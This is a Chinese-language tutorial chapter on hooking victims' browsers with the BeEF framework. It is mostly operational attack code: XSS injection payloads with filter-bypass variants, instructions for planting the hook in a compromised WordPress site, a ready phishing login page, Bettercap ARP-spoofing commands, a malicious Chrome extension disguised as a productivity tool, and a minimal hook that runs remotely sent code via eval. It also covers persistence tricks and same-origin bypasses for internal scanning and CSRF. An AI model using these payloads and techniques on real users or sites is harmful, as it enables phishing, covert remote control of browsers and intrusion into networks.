# 第3章 钩子（Hook）技术详解

### 3.1 Hook的工作原理

BeEF Hook是整个框架的核心，它是一段JavaScript代码（通常称为hook.js），当被注入到目标浏览器中后，会建立起目标浏览器与BeEF服务器之间的通信通道。

#### Hook.js的核心功能

1. **初始化与注册**：加载后立即向BeEF服务器注册，获取唯一的会话ID（BeEF Hook ID）
2. **心跳通信**：定期向服务器发送心跳包，维持在线状态
3. **命令轮询**：检查是否有新的命令需要执行
4. **命令执行**：执行服务器下发的JavaScript命令
5. **结果回传**：将命令执行结果发送回服务器
6. **模块加载**：按需加载额外的功能模块代码

#### 通信机制

BeEF支持多种通信方式，优先级从高到低：

1. **WebSocket**（推荐）：双向实时通信，延迟低
2. **XMLHttpRequest轮询**：传统AJAX轮询
3. **跨域资源共享（CORS）**：用于跨域场景
4. **JSONP**：旧版浏览器兼容

**心跳机制工作流程：**

```
  Hook.js (Browser)              BeEF Server
       |                              |
       |---- 初始注册请求 ----------->|
       |                              |
       |<--- 返回hook_session_id ----|
       |                              |
       |                              |
       |---- 心跳 / 拉取命令 -------->|
       |                              |
       |<--- 命令列表（可能为空）-----|
       |                              |
       |-- 执行命令 --|               |
       |              |               |
       |---- 结果回传 -------------->|
       |                              |
       |---- 心跳 / 拉取命令 -------->|
       |                              |
       ...                            ...
```

#### Hook会话标识

每个被Hook的浏览器都会被分配一个唯一的会话标识，存储在浏览器的Cookie中（默认名为 `BEEFHOOK`）。即使页面刷新或跳转，只要Cookie还在，BeEF就能识别出是同一个浏览器。

### 3.2 多种Hook注入方式

要让BeEF发挥作用，第一步就是将Hook.js注入到目标浏览器中。以下是常见的注入方式。

#### 方式一：XSS注入钩子

跨站脚本攻击（XSS）是注入BeEF Hook最经典的方式。当目标网站存在XSS漏洞时，可以将Hook脚本注入到页面中。

**反射型XSS注入示例：**

```
http://vulnerable-site.com/search?q=<script src="http://beef-server:3000/hook.js"></script>
```

**存储型XSS注入示例：**

在评论框、用户资料等可持久化输入的位置提交：

```html
<script src="http://beef-server:3000/hook.js"></script>
```

**DOM型XSS注入：**

通过操纵URL参数或DOM结构触发。

**绕过XSS过滤器的常见手法：**

```html
<!-- 1. 使用不同的标签 -->
<img src=x onerror="s=document.createElement('script');s.src='http://beef:3000/hook.js';document.body.appendChild(s)">

<!-- 2. 编码绕过 -->
<script src=//beef-server:3000/hook.js></script>

<!-- 3. 事件触发 -->
<body onload="document.body.appendChild(document.createElement('script')).src='http://beef:3000/hook.js'">

<!-- 4. SVG注入 -->
<svg onload="document.body.appendChild(document.createElement('script')).src='http://beef:3000/hook.js'">
```

> **截图位置说明**：在BeEF管理界面的"Module Tree" -> "XSS"分类下，可以找到各种XSS相关的辅助模块，包括XssRays自动扫描工具。

#### 方式二：水坑攻击注入

水坑攻击（Watering Hole Attack）是指攻击者攻陷目标人群经常访问的网站，在其中植入恶意代码。

**实施步骤：**

1. **信息收集**：确定目标群体常访问的网站
2. **网站攻陷**：利用漏洞或社会工程手段获取网站控制权
3. **植入Hook**：在网站页面中添加Hook.js引用
4. **等待上钩**：目标访问网站时自动被Hook

**示例：在WordPress网站植入Hook**

如果攻陷了一个WordPress网站，可以在主题的header.php中添加：

```php
<!-- BeEF Hook -->
<script src="http://beef-server:3000/hook.js" type="text/javascript"></script>
```

或者通过插件方式注入。

#### 方式三：社会工程学注入（钓鱼页面）

这是最常用也最有效的方式之一，通过制作钓鱼页面诱导用户访问。

**常见场景：**

1. **仿冒登录页面**：制作与目标系统一模一样的登录页面，嵌入Hook脚本
2. **伪造文档页面**：声称是某个重要文档的在线查看页面
3. **有奖调查问卷**：以奖励为诱饵吸引用户填写
4. **软件下载页**：提供"破解软件"、"免费工具"等下载

**示例：简单钓鱼页面**

```html
<!DOCTYPE html>
<html>
<head>
    <title>员工登录 - XX公司</title>
    <meta charset="UTF-8">
    <!-- BeEF Hook -->
    <script src="http://your-beef-server:3000/hook.js"></script>
    <style>
        /* 仿冒目标登录页面样式 */
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .login-box { width: 300px; margin: 100px auto; padding: 30px; 
                     background: white; border-radius: 5px; 
                     box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; 
                border: 1px solid #ddd; border-radius: 3px; }
        button { width: 100%; padding: 10px; background: #007bff; 
                 color: white; border: none; border-radius: 3px; 
                 cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>员工邮箱登录</h2>
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="邮箱地址" required>
            <input type="password" name="password" placeholder="密码" required>
            <button type="submit">登录</button>
        </form>
    </div>
</body>
</html>
```

> **截图位置说明**：在BeEF的"Social Engineering"模块分类下，有多个预制的钓鱼页面模板，如"Pretty Theft"、"Fake Notification Bar"等，可以直接使用。

#### 方式四：中间人攻击注入

在中间人（MITM）攻击场景中，攻击者可以拦截并修改HTTP流量，注入Hook脚本。

**常用工具配合：**

1. **Bettercap**：集成了BeEF注入功能
2. **MITMProxy**：通过脚本注入Hook
3. **Ettercap**：配合filter脚本

**Bettercap + BeEF示例：**

```bash
# 启动bettercap
bettercap -iface eth0

# 启用ARP欺骗
arp.spoof on

# 启用HTTP代理
http.proxy on

# 设置BeEF注入
set http.proxy.script /usr/share/bettercap/caplets/beefinject/beefinject.js
set beefinject.hook_url http://beef-server:3000/hook.js
```

#### 方式五：浏览器扩展注入

通过恶意浏览器扩展注入Hook脚本，这种方式隐蔽性高，持久化强。

**示例：Chrome扩展注入**

创建一个恶意扩展的 `manifest.json`：

```json
{
  "manifest_version": 2,
  "name": "Productivity Booster",
  "version": "1.0",
  "description": "提升您的浏览效率",
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["inject.js"],
      "run_at": "document_start"
    }
  ],
  "permissions": ["<all_urls>"]
}
```

`inject.js` 内容：

```javascript
(function() {
    var beefHost = 'http://beef-server:3000';
    var script = document.createElement('script');
    script.src = beefHost + '/hook.js';
    script.type = 'text/javascript';
    (document.head || document.documentElement).appendChild(script);
})();
```

### 3.3 Hook.js详解

#### Hook.js的核心结构

Hook.js是BeEF框架的客户端核心，其代码组织如下：

```javascript
// 核心命名空间
window.beef = {
    // 配置信息
    beefversion: '0.5.4.0',
    hookSessionId: null,
    browser: null,
    os: null,
    
    // 网络相关
    net: {
        request: function(url, handler, method, data, headers, timeout) { ... }
    },
    
    // 状态管理
    status: {
        isConnected: false,
        last_heartbeat: 0
    },
    
    // 命令执行
    do_stuff: function(cmds) { ... },
    execute: function(func, args) { ... },
    
    // 模块系统
    regCmp: function(mod_id, result) { ... },
    load: function(mod_path, cb) { ... },
    
    // 初始化
    init: function() { ... }
};
```

#### 关键函数解析

**1. 初始化函数 `beef.init()`**

```javascript
beef.init = function() {
    // 1. 浏览器指纹检测
    beef.browser = beef.browser.detect();
    beef.os = beef.os.detect();
    
    // 2. 获取或生成会话ID
    beef.hookSessionId = beef.cookie.get('BEEFHOOK');
    if (!beef.hookSessionId) {
        beef.hookSessionId = beef.generateId();
        beef.cookie.set('BEEFHOOK', beef.hookSessionId, 365);
    }
    
    // 3. 初始注册
    beef.net.request(beef.ajax + '/init', beef.init_callback, 'POST', 
        JSON.stringify({...}));
    
    // 4. 启动心跳
    beef.up();
};
```

**2. 心跳函数 `beef.up()`**

```javascript
beef.up = function() {
    // 定期向服务器发送心跳，拉取新命令
    beef.net.request(beef.ajax, function(response) {
        // 处理返回的命令列表
        if (response.cmds && response.cmds.length > 0) {
            beef.do_stuff(response.cmds);
        }
        // 继续下一次心跳
        setTimeout(beef.up, beef.hb);
    }, 'POST', JSON.stringify({...}));
};
```

**3. 命令执行 `beef.do_stuff(cmds)`**

```javascript
beef.do_stuff = function(cmds) {
    for (var i = 0; i < cmds.length; i++) {
        var cmd = cmds[i];
        // 动态加载模块代码
        if (cmd.hasOwnProperty('mod_path')) {
            beef.load(cmd.mod_path, function() {
                // 模块加载完成后执行
                beef.execute(cmd.handler, cmd.data);
            });
        } else {
            beef.execute(cmd.handler, cmd.data);
        }
    }
};
```

#### 自定义Hook脚本

在某些场景下，可能需要自定义Hook脚本，例如：

- 绕过WAF检测
- 添加额外的初始化逻辑
- 修改通信方式
- 混淆代码以躲避检测

**基本的最小化Hook示例：**

```javascript
(function() {
    var beefServer = 'http://beef-server:3000';
    var hookId = localStorage.getItem('beef_hook_id') || 
                 Math.random().toString(36).substring(7);
    localStorage.setItem('beef_hook_id', hookId);
    
    function heartbeat() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', beefServer + '/hook', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                var response = JSON.parse(xhr.responseText);
                // 处理命令
                if (response.cmds) {
                    response.cmds.forEach(function(cmd) {
                        try { eval(cmd.code); } catch(e) {}
                    });
                }
                setTimeout(heartbeat, 2000);
            }
        };
        xhr.send(JSON.stringify({
            hook_id: hookId,
            browser: navigator.userAgent,
            url: window.location.href
        }));
    }
    
    heartbeat();
})();
```

> **注意**：以上仅为概念演示，实际的BeEF Hook.js功能要复杂得多，包含错误处理、模块加载系统、多种通信机制等。

### 3.4 持久化Hook技术

Hook的持久性是指，即使用户关闭当前页面或浏览其他页面，Hook仍然能够保持有效。

#### 持久化技术分类

| 技术 | 原理 | 持久化程度 | 隐蔽性 | 浏览器兼容性 |
|------|------|-----------|--------|-------------|
| Cookie持久化 | 用Cookie存储Hook ID | 中（用户可清除Cookie） | 高 | 所有浏览器 |
| Iframe嵌套 | 在iframe中保持连接 | 中（需同源） | 中 | 所有浏览器 |
| Window.open弹窗 | 弹出隐藏窗口 | 低（易被发现） | 低 | 受弹窗拦截限制 |
| LocalStorage | 用LocalStorage存储状态 | 中 | 高 | 现代浏览器 |
| Service Worker | 后台服务进程 | 高 | 高 | 现代浏览器（需HTTPS） |
| 浏览器扩展 | 通过扩展注入 | 最高 | 中 | 需安装扩展 |
| 历史记录API | 操纵浏览历史 | 低 | 中 | 现代浏览器 |

#### 常用持久化模块

BeEF内置了多个持久化模块，位于 "Persistence" 分类下：

1. **Confirm Close Tab**：当用户尝试关闭标签页时弹出确认对话框，延迟关闭时间
2. **Create Foreground Iframe**：在当前页面创建覆盖全屏的iframe，用户在新页面中浏览，原页面保持Hook
3. **Create Pop Under**：在当前窗口后面弹出一个新窗口，保持后台Hook
4. **Full Screen Iframe**：将当前页面替换为全屏iframe
5. **Intercept Link**：拦截页面上的所有链接点击，在后台保持连接

**示例：使用Create Foreground Iframe模块**

1. 在BeEF管理界面选择目标浏览器
2. 展开 "Persistence" -> "Create Foreground Iframe"
3. 配置参数：
   - **target**：要显示的目标URL（如用户原本要访问的页面）
4. 点击"Execute"执行

执行后，当前页面会被一个全屏的iframe覆盖，用户看到的是目标URL的内容，但实际的Hook连接在父页面中保持。

#### 进阶：Service Worker持久化

Service Worker是浏览器的后台脚本，可以在页面关闭后仍然运行一段时间，是最强的浏览器端持久化方式之一。

**示例概念代码：**

```javascript
// 注册Service Worker
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js').then(function(reg) {
        console.log('Service Worker registered');
    });
}

// sw.js - Service Worker脚本
self.addEventListener('fetch', function(event) {
    // 拦截请求，注入Hook
    event.respondWith(
        fetch(event.request).then(function(response) {
            if (response.headers.get('content-type').includes('text/html')) {
                // 注入Hook脚本
                // ...
            }
            return response;
        })
    );
});
```

### 3.5 绕过同源策略

同源策略（Same-Origin Policy）是浏览器的核心安全机制，限制了不同源之间的资源访问。BeEF需要多种手段来绕过这一限制。

#### 什么是同源策略

如果两个URL的协议、域名和端口都相同，则它们属于同一个源。

| URL1 | URL2 | 是否同源 | 原因 |
|------|------|---------|------|
| http://a.com/page1 | http://a.com/page2 | 是 | 协议、域名、端口都相同 |
| http://a.com | https://a.com | 否 | 协议不同 |
| http://a.com | http://b.com | 否 | 域名不同 |
| http://a.com:8080 | http://a.com:80 | 否 | 端口不同 |

#### BeEF中的绕过技术

**1. 跨域资源共享（CORS）**

BeEF服务器配置了CORS响应头，允许Hook.js从任何源向BeEF服务器发送请求：

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
```

**2. JSONP回调**

对于不支持CORS的旧版浏览器，BeEF使用JSONP方式通信：

```javascript
// 动态创建script标签
var script = document.createElement('script');
script.src = 'http://beef-server:3000/hook?callback=handleResponse&data=' + 
             encodeURIComponent(jsonData);
document.body.appendChild(script);
```

**3. 图片信标（Image Beacon）**

使用Image对象发送简单数据（如心跳）：

```javascript
var img = new Image();
img.src = 'http://beef-server:3000/beacon?data=' + encodeURIComponent(data);
```

**4. 跨域请求骑乘（Cross-Origin Request Riding）**

这是BeEF的一项高级功能，利用被Hook的浏览器作为代理，向其他域发送请求。虽然由于同源策略无法读取响应内容，但可以用于：

- 内网端口扫描（通过加载时间判断端口是否开放）
- CSRF攻击（发送修改状态的请求）
- 内网主机发现

**5. DNS探测绕过**

通过创建指向目标域名的img/script/link标签，触发DNS解析，从而探测内网主机名是否存在，而不受同源策略限制。

**6. WebSocket跨域**

WebSocket协议本身不受同源策略限制（虽然有Origin头检查），BeEF可以利用WebSocket建立跨域通信通道。

---

---

